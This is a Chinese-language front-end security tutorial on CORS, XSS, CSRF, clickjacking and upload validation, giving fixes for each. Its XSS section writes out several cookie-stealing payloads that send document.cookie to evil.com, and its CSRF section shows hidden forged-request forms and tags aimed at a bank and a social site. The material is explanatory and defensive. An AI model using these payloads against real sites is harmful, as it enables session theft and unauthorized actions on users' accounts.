# 浏览器安全知识的实际应用

## 第一部分：跨域（CORS）问题

### 什么是跨域

```
同源策略：
协议 + 域名 + 端口 相同才能访问

例子：
https://example.com:443/page1
https://example.com:443/page2  ✓ 同源
https://example.com:8080/page  ✗ 不同源（端口不同）
https://other.com/page         ✗ 不同源（域名不同）
http://example.com/page        ✗ 不同源（协议不同）
```

### 实际场景 1：前端调用第三方 API

**场景描述**
```
你的网站：https://myapp.com
第三方 API：https://api.thirdparty.com

前端代码：
fetch('https://api.thirdparty.com/data')
  .then(res => res.json())
  .catch(err => console.error(err));

结果：浏览器报错
错误信息：
Access to XMLHttpRequest at 'https://api.thirdparty.com/data' 
from origin 'https://myapp.com' has been blocked by CORS policy
```

**为什么会这样**
```
浏览器的同源策略保护用户隐私
防止恶意网站访问用户的数据

例子：
用户登录了银行网站（bank.com）
用户访问恶意网站（evil.com）
恶意网站想要访问 bank.com 的数据
浏览器阻止这个请求
保护用户隐私
```

**解决方案 1：后端添加 CORS 响应头**
```
后端代码（Node.js/Express）：
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'https://myapp.com');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

浏览器看到这个响应头
认为第三方 API 允许跨域请求
允许前端访问数据
```

**解决方案 2：前端使用代理**
```
前端不直接调用第三方 API
而是调用自己的后端 API

前端代码：
fetch('/api/proxy/thirdparty')
  .then(res => res.json());

后端代码：
app.get('/api/proxy/thirdparty', async (req, res) => {
  const data = await fetch('https://api.thirdparty.com/data');
  res.json(data);
});

为什么这样可以：
浏览器只限制前端的跨域请求
后端之间的请求没有同源策略限制
```

**解决方案 3：使用 JSONP（过时）**
```
JSONP 利用 <script> 标签没有跨域限制

前端代码：
<script src="https://api.thirdparty.com/data?callback=handleData"></script>

<script>
function handleData(data) {
  console.log(data);
}
</script>

后端返回：
handleData({name: 'John', age: 30});

为什么这样可以：
<script> 标签可以加载任何域的脚本
浏览器不限制 <script> 的跨域请求

缺点：
只支持 GET 请求
容易被 XSS 攻击
已经过时，不推荐使用
```

### 实际场景 2：前端调用自己的后端 API

**场景描述**
```
你的网站：https://myapp.com
你的后端 API：https://api.myapp.com

前端代码：
fetch('https://api.myapp.com/data')
  .then(res => res.json());

结果：浏览器报错
错误信息：
Access to XMLHttpRequest at 'https://api.myapp.com/data' 
from origin 'https://myapp.com' has been blocked by CORS policy
```

**为什么会这样**
```
虽然都是你的网站
但域名不同（myapp.com vs api.myapp.com）
浏览器仍然认为是跨域
```

**解决方案**
```
后端添加 CORS 响应头：
res.header('Access-Control-Allow-Origin', 'https://myapp.com');

或者使用通配符（不安全）：
res.header('Access-Control-Allow-Origin', '*');

或者使用 CORS 中间件：
const cors = require('cors');
app.use(cors({
  origin: 'https://myapp.com',
  credentials: true
}));
```

### 实际场景 3：发送 Cookie

**场景描述**
```
你的网站：https://myapp.com
你的后端 API：https://api.myapp.com

用户登录后，后端返回 Cookie
前端需要在后续请求中发送 Cookie

前端代码：
fetch('https://api.myapp.com/data')
  .then(res => res.json());

问题：Cookie 没有被发送
```

**为什么会这样**
```
跨域请求默认不发送 Cookie
浏览器认为这是不安全的
```

**解决方案**
```
前端代码：
fetch('https://api.myapp.com/data', {
  credentials: 'include'  // 发送 Cookie
})
.then(res => res.json());

后端代码：
res.header('Access-Control-Allow-Origin', 'https://myapp.com');
res.header('Access-Control-Allow-Credentials', 'true');

注意：
credentials: 'include' 时
Access-Control-Allow-Origin 不能是 '*'
必须指定具体的域名
```

---

## 第二部分：XSS 攻击

### 什么是 XSS 攻击

```
XSS = Cross-Site Scripting（跨站脚本攻击）

攻击方式：
在网页中注入恶意脚本
脚本在用户浏览器中执行
窃取用户数据或进行恶意操作
```

### 实际场景 1：用户输入的内容被直接显示

**场景描述**
```
你的网站有一个评论功能
用户可以输入评论
评论被直接显示在页面上

用户输入：
<script>alert('XSS')</script>

前端代码（不安全）：
const comment = getUserInput();
document.getElementById('comments').innerHTML = comment;

结果：
脚本被执行
用户看到 alert 弹窗
```

**为什么这样不安全**
```
恶意用户可以输入：
<script>
  // 窃取用户的 Cookie
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

或者：
<img src=x onerror="fetch('https://evil.com/steal?cookie=' + document.cookie)">

或者：
<svg onload="fetch('https://evil.com/steal?cookie=' + document.cookie)">

这些脚本会在其他用户的浏览器中执行
窃取他们的 Cookie
```

**解决方案 1：使用 textContent 而不是 innerHTML**
```
前端代码（安全）：
const comment = getUserInput();
document.getElementById('comments').textContent = comment;

为什么这样安全：
textContent 将内容作为文本处理
不会解析 HTML 标签
脚本不会被执行
```

**解决方案 2：转义用户输入**
```
前端代码：
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

const comment = getUserInput();
const safeComment = escapeHtml(comment);
document.getElementById('comments').innerHTML = safeComment;

为什么这样安全：
< 被转义为 &lt;
> 被转义为 &gt;
脚本标签不会被解析
```

**解决方案 3：使用 DOMPurify 库**
```
前端代码：
import DOMPurify from 'dompurify';

const comment = getUserInput();
const safeComment = DOMPurify.sanitize(comment);
document.getElementById('comments').innerHTML = safeComment;

为什么这样安全：
DOMPurify 会移除所有危险的标签和属性
只保留安全的 HTML
```

### 实际场景 2：URL 参数被直接使用

**场景描述**
```
你的网站有一个搜索功能
搜索关键词通过 URL 参数传递
搜索结果页面显示搜索关键词

URL：
https://myapp.com/search?q=<script>alert('XSS')</script>

前端代码（不安全）：
const q = new URLSearchParams(window.location.search).get('q');
document.getElementById('result').innerHTML = `搜索结果：${q}`;

结果：
脚本被执行
用户看到 alert 弹窗
```

**为什么这样不安全**
```
恶意用户可以构造一个 URL：
https://myapp.com/search?q=<img src=x onerror="fetch('https://evil.com/steal?cookie=' + document.cookie)">

然后分享这个 URL 给其他用户
其他用户点击这个 URL
脚本在他们的浏览器中执行
他们的 Cookie 被窃取
```

**解决方案**
```
前端代码（安全）：
const q = new URLSearchParams(window.location.search).get('q');
document.getElementById('result').textContent = `搜索结果：${q}`;

或者使用转义：
const q = new URLSearchParams(window.location.search).get('q');
const safeQ = escapeHtml(q);
document.getElementById('result').innerHTML = `搜索结果：${safeQ}`;
```

### 实际场景 3：从后端获取的数据被直接显示

**场景描述**
```
你的网站从后端获取用户信息
用户信息被直接显示在页面上

后端返回：
{
  name: "<img src=x onerror=\"fetch('https://evil.com/steal?cookie=' + document.cookie)\">",
  email: "user@example.com"
}

前端代码（不安全）：
fetch('/api/user')
  .then(res => res.json())
  .then(data => {
    document.getElementById('name').innerHTML = data.name;
  });

结果：
脚本被执行
用户的 Cookie 被窃取
```

**为什么这样不安全**
```
虽然数据来自后端
但如果后端的数据被污染
或者后端本身被攻击
恶意数据仍然会被执行
```

**解决方案**
```
前端代码（安全）：
fetch('/api/user')
  .then(res => res.json())
  .then(data => {
    document.getElementById('name').textContent = data.name;
  });

或者使用转义：
fetch('/api/user')
  .then(res => res.json())
  .then(data => {
    const safeName = escapeHtml(data.name);
    document.getElementById('name').innerHTML = safeName;
  });
```

---

## 第三部分：CSRF 攻击

### 什么是 CSRF 攻击

```
CSRF = Cross-Site Request Forgery（跨站请求伪造）

攻击方式：
诱导用户在其他网站执行操作
用户不知道自己在执行什么操作
操作在用户的账户上执行
```

### 实际场景 1：转账操作

**场景描述**
```
用户登录了银行网站（bank.com）
用户访问恶意网站（evil.com）
恶意网站有一个隐藏的表单

恶意网站的代码：
<form action="https://bank.com/transfer" method="POST" style="display:none;">
  <input name="to" value="attacker@evil.com">
  <input name="amount" value="1000">
</form>

<script>
  document.forms[0].submit();
</script>

结果：
用户的浏览器自动提交表单
用户的钱被转到攻击者的账户
用户不知道发生了什么
```

**为什么会这样**
```
用户已经登录了银行网站
浏览器保存了登录 Cookie
当用户访问恶意网站时
恶意网站可以向银行网站发送请求
浏览器会自动发送 Cookie
银行网站认为这是用户的合法请求
```

**解决方案 1：使用 CSRF Token**
```
后端代码：
app.get('/transfer', (req, res) => {
  const token = generateRandomToken();
  req.session.csrfToken = token;
  res.render('transfer', { token });
});

app.post('/transfer', (req, res) => {
  const token = req.body.token;
  if (token !== req.session.csrfToken) {
    res.status(403).send('CSRF token invalid');
    return;
  }
  // 执行转账
});

前端代码：
<form action="/transfer" method="POST">
  <input type="hidden" name="token" value="<%= token %>">
  <input name="to" placeholder="转账到">
  <input name="amount" placeholder="金额">
  <button type="submit">转账</button>
</form>

为什么这样安全：
恶意网站不知道 CSRF Token
无法构造有效的请求
```

**解决方案 2：检查 Referer 头**
```
后端代码：
app.post('/transfer', (req, res) => {
  const referer = req.headers.referer;
  if (!referer || !referer.startsWith('https://bank.com')) {
    res.status(403).send('Invalid referer');
    return;
  }
  // 执行转账
});

为什么这样安全：
恶意网站的 Referer 是 evil.com
银行网站拒绝这个请求

缺点：
某些情况下 Referer 可能被隐藏
不够可靠
```

**解决方案 3：使用 SameSite Cookie**
```
后端代码：
res.cookie('sessionId', token, {
  sameSite: 'Strict'  // 或 'Lax'
});

为什么这样安全：
sameSite: 'Strict' - 跨站请求不发送 Cookie
sameSite: 'Lax' - 只在安全的跨站请求中发送 Cookie

这样恶意网站无法获得用户的 Cookie
```

### 实际场景 2：修改用户信息

**场景描述**
```
用户登录了社交网站（social.com）
用户访问恶意网站（evil.com）
恶意网站有一个隐藏的请求

恶意网站的代码：
<img src="https://social.com/api/profile?name=hacked&bio=I%20am%20hacked">

结果：
用户的浏览器发送这个请求
用户的个人信息被修改
用户不知道发生了什么
```

**解决方案**
```
后端代码：
app.post('/api/profile', (req, res) => {
  const token = req.headers['x-csrf-token'];
  if (token !== req.session.csrfToken) {
    res.status(403).send('CSRF token invalid');
    return;
  }
  // 修改个人信息
});

前端代码：
const token = document.querySelector('meta[name="csrf-token"]').content;

fetch('/api/profile', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': token,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ name: 'John', bio: 'Hello' })
});

为什么这样安全：
恶意网站无法设置自定义请求头
浏览器的同源策略阻止这个操作
```

---

## 第四部分：其他安全问题

### 1. 点击劫持（Clickjacking）

**场景描述**
```
恶意网站在透明的 iframe 中加载你的网站
用户以为在点击恶意网站的按钮
实际上在点击你的网站的按钮
```

**解决方案**
```
后端代码：
res.header('X-Frame-Options', 'DENY');
// 或
res.header('X-Frame-Options', 'SAMEORIGIN');

为什么这样安全：
X-Frame-Options: DENY - 不允许在 iframe 中加载
X-Frame-Options: SAMEORIGIN - 只允许同源的 iframe 加载
```

### 2. 中间人攻击（Man-in-the-Middle）

**场景描述**
```
用户在公共 WiFi 上访问你的网站
攻击者拦截用户的请求
修改请求或响应
窃取用户的数据
```

**解决方案**
```
使用 HTTPS：
https://myapp.com

为什么这样安全：
HTTPS 加密了请求和响应
攻击者无法读取或修改数据
```

### 3. 恶意文件上传

**场景描述**
```
用户上传一个文件
文件被保存在服务器上
其他用户下载这个文件
文件包含恶意代码
```

**解决方案**
```
前端代码：
// 检查文件类型
const file = document.getElementById('file').files[0];
if (!['image/jpeg', 'image/png'].includes(file.type)) {
  alert('只支持 JPEG 和 PNG 格式');
  return;
}

// 检查文件大小
if (file.size > 5 * 1024 * 1024) {
  alert('文件大小不能超过 5MB');
  return;
}

后端代码：
// 再次检查文件类型
const allowedTypes = ['image/jpeg', 'image/png'];
if (!allowedTypes.includes(file.mimetype)) {
  res.status(400).send('Invalid file type');
  return;
}

// 检查文件内容
const magic = file.buffer.slice(0, 4);
if (!isValidImageMagic(magic)) {
  res.status(400).send('Invalid file');
  return;
}

// 重命名文件
const filename = generateRandomFilename();
file.mv(`./uploads/${filename}`);
```

---

## 第五部分：实际开发中的安全最佳实践

### 1. 输入验证

```
前端代码：
function validateEmail(email) {
  const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return regex.test(email);
}

const email = getUserInput();
if (!validateEmail(email)) {
  alert('邮箱格式不正确');
  return;
}

后端代码：
// 再次验证（不要相信前端的验证）
if (!validateEmail(email)) {
  res.status(400).send('Invalid email');
  return;
}
```

### 2. 输出转义

```
前端代码：
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

const userInput = getUserInput();
const safeOutput = escapeHtml(userInput);
document.getElementById('output').innerHTML = safeOutput;
```

### 3. 使用安全的 API

```
不安全：
document.getElementById('output').innerHTML = userInput;

安全：
document.getElementById('output').textContent = userInput;

或者：
const div = document.createElement('div');
div.textContent = userInput;
document.getElementById('output').appendChild(div);
```

### 4. 设置安全的 HTTP 头

```
后端代码：
app.use((req, res, next) => {
  // 防止 XSS
  res.header('X-Content-Type-Options', 'nosniff');
  res.header('X-XSS-Protection', '1; mode=block');
  
  // 防止点击劫持
  res.header('X-Frame-Options', 'SAMEORIGIN');
  
  // 防止中间人攻击
  res.header('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  
  // 设置 CSP
  res.header('Content-Security-Policy', "default-src 'self'");
  
  next();
});
```

### 5. 使用 HTTPS

```
所有请求都应该使用 HTTPS
不要使用 HTTP
```

---

## 总结

### 跨域问题

```
问题：浏览器的同源策略阻止跨域请求
原因：保护用户隐私
解决方案：
├─ 后端添加 CORS 响应头
├─ 前端使用代理
├─ 使用 JSONP（过时）
└─ 发送 Cookie 时使用 credentials: 'include'
```

### XSS 攻击

```
问题：恶意脚本在用户浏览器中执行
原因：用户输入被直接显示
解决方案：
├─ 使用 textContent 而不是 innerHTML
├─ 转义用户输入
├─ 使用 DOMPurify 库
├─ 设置 CSP
└─ 从后端获取的数据也要转义
```

### CSRF 攻击

```
问题：恶意网站诱导用户执行操作
原因：浏览器自动发送 Cookie
解决方案：
├─ 使用 CSRF Token
├─ 检查 Referer 头
├─ 使用 SameSite Cookie
└─ 使用自定义请求头
```

### 其他安全问题

```
点击劫持：使用 X-Frame-Options
中间人攻击：使用 HTTPS
恶意文件上传：验证文件类型和内容
```

### 关键原则

```
1. 永远不要相信用户输入
2. 永远不要相信前端的验证
3. 在后端再次验证所有输入
4. 转义所有输出
5. 使用 HTTPS
6. 设置安全的 HTTP 头
7. 定期更新依赖
8. 进行安全审计
```
